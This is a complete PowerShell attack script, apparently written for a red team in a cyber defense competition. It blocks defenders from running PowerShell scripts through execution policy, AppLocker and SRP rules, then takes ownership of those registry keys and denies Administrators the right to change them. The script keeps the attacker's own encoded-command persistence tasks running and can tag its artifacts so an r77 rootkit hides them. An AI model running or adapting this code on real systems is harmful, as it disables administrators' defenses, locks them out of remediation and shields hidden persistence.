# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 2 -- PowerShell: Script Kill
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
#               T1112     (Modify Registry)
#
# Targets: Windows Server 2019, Server 2022, Windows 10
#
# Description:
#   Blocks PowerShell SCRIPT execution (.ps1/.psm1/.psd1 files) while leaving
#   the interactive prompt functional. Safe to run in Phase 2 before C2 is
#   confirmed stable -- our own persistence tasks use -EncodedCommand (in-memory,
#   not a .ps1 file path) and are unaffected by all three layers here.
#
#   -Tag77 : prefix all named artifacts with $77 so r77Shadow hides them.
#            Run Rootkit_r77Shadow.ps1 BEFORE this script when using -Tag77.
#
#   LAYER 1 -- MACHINE GP EXECUTIONPOLICY LOCK
#     Writes ExecutionPolicy=Restricted + EnableScripts=0 to the MachinePolicy
#     hive. This hive wins over -ExecutionPolicy Bypass on the CLI -- blue team
#     cannot override it without first taking ownership of the registry key.
#     Key ACL-locked after write.
#
#   LAYER 2 -- APPLOCKER SCRIPT COLLECTION ENFORCEMENT
#     Sets AppLocker Script RuleCollection EnforcementMode="Enabled" and adds
#     FilePathCondition DENY rules for *.ps1, *.psm1, *.psd1, *.ps1xml,
#     *.pssc, *.psc1 (all PS script extensions). Admin and SYSTEM Allow rules
#     are preserved so the OS and our scheduled tasks are unaffected.
#     SrpV2 and AppIDSvc registry keys ACL-locked after write.
#
#   LAYER 3 -- SRP DISALLOWED EXTENSION RULES
#     Adds HKLM Safer\CodeIdentifiers\0\Paths disallowed rules for *.ps1,
#     *.psm1, *.psd1. Independent of AppLocker -- evaluated by a separate
#     code path, so clearing one layer does not clear the other.
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    [switch]$Tag77
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

# WinPriv -- enables SeTakeOwnershipPrivilege + SeRestorePrivilege for registry ACL work
if (-not ([System.Management.Automation.PSTypeName]'WinPriv').Type) {
    Add-Type @'
using System;
using System.Runtime.InteropServices;

public class WinPriv {
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool LookupPrivilegeValue(string sys, string name, out long luid);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis,
        ref TP priv, uint z, IntPtr n1, IntPtr n2);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential, Pack=1)]
    private struct LA { public long Luid; public uint Attr; }
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    private struct TP  { public uint Count; public LA P; }

    public static bool Enable(string name) {
        IntPtr tok; long luid;
        if (!OpenProcessToken(GetCurrentProcess(), 0x28, out tok)) return false;
        if (!LookupPrivilegeValue(null, name, out luid)) return false;
        TP p = new TP { Count = 1, P = new LA { Luid = luid, Attr = 2 } };
        return AdjustTokenPrivileges(tok, false, ref p, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
'@
}

function Lock-RegistryKey {
    # Takes ownership as SYSTEM, then denies Administrators write/delete/createsubkey
    param([string]$SubKey)
    try {
        [WinPriv]::Enable("SeTakeOwnershipPrivilege") | Out-Null
        [WinPriv]::Enable("SeRestorePrivilege")       | Out-Null

        $hive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default)

        $k = $hive.OpenSubKey($SubKey,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        if (-not $k) { Write-Warn "Lock-RegistryKey: cannot open $SubKey for TakeOwnership"; return }
        $acl = $k.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
        $sys = New-Object System.Security.Principal.SecurityIdentifier(
            [System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
        $acl.SetOwner($sys)
        $k.SetAccessControl($acl)
        $k.Close()

        $k = $hive.OpenSubKey($SubKey,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $k) { Write-Warn "Lock-RegistryKey: cannot open $SubKey for ChangePermissions"; return }
        $acl    = $k.GetAccessControl()
        $adm    = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
        $rights = [System.Security.AccessControl.RegistryRights]"SetValue,CreateSubKey,Delete"
        $deny   = New-Object System.Security.AccessControl.RegistryAccessRule(
            $adm, $rights,
            [System.Security.AccessControl.InheritanceFlags]::None,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny)
        $acl.AddAccessRule($deny)
        $k.SetAccessControl($acl)
        $k.Close()
        $hive.Close()
        Write-Success "ACL locked: HKLM:\$SubKey"
    } catch {
        Write-Warn "Lock-RegistryKey failed ($SubKey): $_"
    }
}

# ============================================================
# Config
# ============================================================

# Single-quote assignment keeps the dollar sign literal in the string value
$Prefix = if ($Tag77) { '$77' } else { '' }

$ScriptExts = @('*.ps1', '*.psm1', '*.psd1', '*.ps1xml', '*.pssc', '*.psc1')

$Results = [ordered]@{
    Layer1_PolicyLock = 'PENDING'
    Layer2_AppLocker  = 'PENDING'
    Layer3_SRP        = 'PENDING'
}

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 2 -- PowerShell: Script Kill"
Write-Warn "================================================================"
Write-Warn " Blocks .ps1 script execution -- PS prompt remains functional"
Write-Warn " Our -EncodedCommand tasks are NOT affected"
if ($Tag77) { Write-Info " ++ Tag77 -- artifacts prefixed with `$77 (rootkit hides them)" }
Write-Host ""

# ============================================================
# Layer 1 -- Machine GP ExecutionPolicy Lock
# ============================================================
Write-Section "Layer 1 -- Machine GP ExecutionPolicy Lock"

try {
    $psPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell'
    if (-not (Test-Path $psPol)) {
        New-Item -Path $psPol -Force | Out-Null
        Write-Info "Created PS policy key"
    }
    Set-ItemProperty -Path $psPol -Name 'ExecutionPolicy' -Value 'Restricted' -Type String -Force
    Write-Success "ExecutionPolicy = Restricted (MachinePolicy -- overrides -ExecutionPolicy Bypass on CLI)"
    Set-ItemProperty -Path $psPol -Name 'EnableScripts' -Value 0 -Type DWord -Force
    Write-Success "EnableScripts = 0"

    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\PowerShell'

    $Results['Layer1_PolicyLock'] = "OK -- ExecutionPolicy=Restricted + EnableScripts=0, key ACL-locked"
} catch {
    Write-Err "Layer 1 failed: $_"
    $Results['Layer1_PolicyLock'] = "FAILED -- $_"
}

# ============================================================
# Layer 2 -- AppLocker Script Collection Enforcement
# ============================================================
Write-Section "Layer 2 -- AppLocker Script Collection Enforcement"

try {
    Set-Service -Name AppIDSvc -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name AppIDSvc -ErrorAction SilentlyContinue
    Write-Info "AppIDSvc started / confirmed running"

    [xml]$policyDoc = (Get-AppLockerPolicy -Effective -Xml)

    # Find or create the Script RuleCollection node
    $scriptCollection = $policyDoc.AppLockerPolicy.RuleCollection |
        Where-Object { $_.Type -eq 'Script' }
    if (-not $scriptCollection) {
        $scriptCollection = $policyDoc.CreateElement('RuleCollection')
        $scriptCollection.SetAttribute('Type','Script')
        $scriptCollection.SetAttribute('EnforcementMode','Enabled')
        $policyDoc.AppLockerPolicy.AppendChild($scriptCollection) | Out-Null
    } else {
        $scriptCollection.SetAttribute('EnforcementMode','Enabled')
    }

    # Ensure Admin allow rule exists -- prevents OS from blocking its own signed scripts
    $hasAdminAllow = $scriptCollection.FilePathRule |
        Where-Object { $_.Action -eq 'Allow' -and $_.UserOrGroupSid -eq 'S-1-5-32-544' }
    if (-not $hasAdminAllow) {
        $frag = $policyDoc.CreateDocumentFragment()
        $frag.InnerXml = '<FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="Allow Admins - all scripts" Description="Default admin allow" UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>'
        $scriptCollection.AppendChild($frag) | Out-Null
    }

    # SYSTEM (S-1-5-18) is not a member of BUILTIN\Administrators -- explicit allow required
    # so our SYSTEM-context scheduled tasks that run PS scripts are not blocked.
    $hasSystemAllow = $scriptCollection.FilePathRule |
        Where-Object { $_.Action -eq 'Allow' -and $_.UserOrGroupSid -eq 'S-1-5-18' }
    if (-not $hasSystemAllow) {
        $frag = $policyDoc.CreateDocumentFragment()
        $frag.InnerXml = '<FilePathRule Id="c7e22f1a-9b3d-4a8c-b5f0-3d4e56789abc" Name="Allow SYSTEM - all scripts" Description="Allow SYSTEM account unrestricted script execution" UserOrGroupSid="S-1-5-18" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>'
        $scriptCollection.AppendChild($frag) | Out-Null
    }

    # Deny rules for all PS script extensions (S-1-1-0 = Everyone)
    foreach ($ext in $ScriptExts) {
        $id       = [System.Guid]::NewGuid().ToString()
        $extClean = $ext -replace '\*\.','_'
        $ruleName = "${Prefix}CCDC_Block_Script_$extClean"
        $frag = $policyDoc.CreateDocumentFragment()
        $frag.InnerXml = "<FilePathRule Id=""$id"" Name=""$ruleName"" Description=""CCDC: block $ext"" UserOrGroupSid=""S-1-1-0"" Action=""Deny""><Conditions><FilePathCondition Path=""$ext""/></Conditions></FilePathRule>"
        $scriptCollection.AppendChild($frag) | Out-Null
    }

    # Ensure Exe and Msi collections exist (required for valid AppLocker policy schema)
    foreach ($collType in @('Exe','Msi')) {
        $coll = $policyDoc.AppLockerPolicy.RuleCollection | Where-Object { $_.Type -eq $collType }
        if (-not $coll) {
            $newColl = $policyDoc.CreateElement('RuleCollection')
            $newColl.SetAttribute('Type',$collType)
            $newColl.SetAttribute('EnforcementMode','NotConfigured')
            $policyDoc.AppLockerPolicy.AppendChild($newColl) | Out-Null
        }
    }

    $tmpXml = "$env:SystemRoot\Temp\${Prefix}ccdc_al_scriptkill.xml"
    $policyDoc.Save($tmpXml)
    Set-AppLockerPolicy -XmlPolicy $tmpXml -Merge -ErrorAction Stop
    Remove-Item $tmpXml -Force -ErrorAction SilentlyContinue
    Write-Success "AppLocker Script deny rules merged: $($ScriptExts -join ', ')"

    if (Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2') {
        Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\SrpV2'
    }
    if (Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Script') {
        Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\SrpV2\Script'
    }
    if (Test-Path 'HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc') {
        Lock-RegistryKey 'SYSTEM\CurrentControlSet\Services\AppIDSvc'
    }

    $Results['Layer2_AppLocker'] = "OK -- $($ScriptExts.Count) Script deny rules, AppIDSvc running, keys ACL-locked"
} catch {
    Write-Err "Layer 2 failed: $_"
    $Results['Layer2_AppLocker'] = "FAILED -- $_"
}

# ============================================================
# Layer 3 -- SRP Disallowed Extension Rules
# ============================================================
Write-Section "Layer 3 -- SRP Disallowed Extension Rules"

try {
    $srpBase  = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers'
    $pathsKey = "$srpBase\0\Paths"

    if (-not (Test-Path $srpBase)) { New-Item -Path $srpBase -Force | Out-Null }
    if (-not (Test-Path $pathsKey)) { New-Item -Path $pathsKey -Force | Out-Null }

    # Only set DefaultLevel if absent -- do not overwrite an existing policy posture
    if (-not (Get-ItemProperty $srpBase -Name 'DefaultLevel' -ErrorAction SilentlyContinue)) {
        Set-ItemProperty $srpBase -Name 'DefaultLevel'       -Value 0x40000 -Type DWord
        Set-ItemProperty $srpBase -Name 'PolicyScope'        -Value 0       -Type DWord
        Set-ItemProperty $srpBase -Name 'ExecutableTypes'    -Value @('EXE') -Type MultiString
        Set-ItemProperty $srpBase -Name 'TransparentEnabled' -Value 1       -Type DWord
    }

    $srpExts   = @('*.ps1', '*.psm1', '*.psd1')
    $addedRules = 0
    foreach ($ext in $srpExts) {
        $existing = Get-ChildItem $pathsKey -ErrorAction SilentlyContinue |
            Where-Object {
                (Get-ItemProperty $_.PSPath -Name 'ItemData' -ErrorAction SilentlyContinue).ItemData -imatch [regex]::Escape($ext)
            }
        if ($existing) { Write-Info "SRP rule already exists for $ext (skip)"; continue }

        $ruleGuid = "{$([System.Guid]::NewGuid().ToString().ToUpper())}"
        $ruleKey  = "$pathsKey\$ruleGuid"
        New-Item -Path $ruleKey -Force | Out-Null
        Set-ItemProperty $ruleKey -Name 'Description'  -Value 'CCDC PS script block'
        Set-ItemProperty $ruleKey -Name 'ItemData'     -Value $ext -Type ExpandString
        Set-ItemProperty $ruleKey -Name 'SaferFlags'   -Value 0    -Type DWord
        Set-ItemProperty $ruleKey -Name 'LastModified' -Value (
            [System.BitConverter]::GetBytes([System.DateTime]::UtcNow.ToFileTimeUtc())
        ) -Type Binary -ErrorAction SilentlyContinue
        Write-Success "SRP disallowed extension added: $ext"
        $addedRules++
    }

    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers'
    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths'

    $Results['Layer3_SRP'] = "OK -- $addedRules new SRP disallowed extension rules (*.ps1/psm1/psd1), keys ACL-locked"
} catch {
    Write-Err "Layer 3 failed: $_"
    $Results['Layer3_SRP'] = "FAILED -- $_"
}

# ============================================================
# Summary
# ============================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Magenta
Write-Host " PowerShell: Script Kill -- Deployment Summary" -ForegroundColor Magenta
Write-Host "================================================================" -ForegroundColor Magenta
Write-Host ""
foreach ($layer in $Results.Keys) {
    $val = $Results[$layer]
    $col = switch -Wildcard ($val) {
        'OK*'      { 'Green'    }
        'PARTIAL*' { 'Yellow'   }
        'FAILED*'  { 'Red'      }
        'SKIPPED*' { 'DarkGray' }
        default    { 'Gray'     }
    }
    Write-Host ("  {0,-22} {1}" -f $layer, $val) -ForegroundColor $col
}
Write-Host ""
Write-Info "PS prompt remains functional -- only .ps1/.psm1/.psd1 file execution is blocked."
Write-Info "Blue team cannot bypass L1 with -ExecutionPolicy Bypass (MachinePolicy hive wins)."
Write-Warn "NOTE: AppLocker (L2) requires AppIDSvc running (auto-start set by this script)."
Write-Warn "NOTE: L2 and L3 apply to new PS sessions; existing sessions are unaffected."
Write-Host ""
